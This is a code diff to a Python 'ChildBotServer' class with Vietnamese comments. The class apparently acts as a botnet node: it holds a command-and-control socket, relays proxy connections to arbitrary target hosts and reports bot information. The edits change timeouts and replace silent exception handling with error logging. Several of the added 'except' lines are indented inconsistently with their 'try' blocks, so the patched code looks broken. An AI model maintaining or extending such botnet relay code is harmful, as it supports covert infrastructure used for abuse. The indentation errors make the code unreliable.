@@ -236,12 +236,12 @@ class ChildBotServer:
             print(f"🔗 Creating proxy connection to {target_host}:{target_port}")
             # Tạo socket đến target
             target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            target_socket.settimeout(30)
+            target_socket.settimeout(10)  # Reduced timeout
             
             # Kết nối đến target
             print(f"📡 Connecting to {target_host}:{target_port}...")
             target_socket.connect((target_host, target_port))
-            target_socket.settimeout(None)
+            target_socket.settimeout(30)  # Set reasonable timeout for data transfer
             
             print(f"✅ Connected to target: {target_host}:{target_port}")
             
@@ -339,8 +339,8 @@ class ChildBotServer:
             
             try:
                 connection['target_socket'].close()
-            except:
-                pass
+        except Exception as e:
+            print(f"⚠️  Error in cleanup: {e}")
                 
             # Update statistics
             self.stats['active_connections'] = max(0, self.stats['active_connections'] - 1)
@@ -348,6 +348,8 @@ class ChildBotServer:
             
             del self.active_connections[connection_id]
             print(f"🔌 Closed connection: {connection_id}")
+        else:
+            print(f"⚠️  Connection {connection_id} not found for closing")
             
     def send_info(self):
         """Gửi thông tin bot"""
@@ -456,8 +458,8 @@ class ChildBotServer:
         if self.c2_socket:
             try:
                 self.c2_socket.close()
-            except:
-                pass
+        except Exception as e:
+            print(f"⚠️  Error in cleanup: {e}")
                 
         self.connected_to_c2 = False
         print("✅ Cleanup completed")
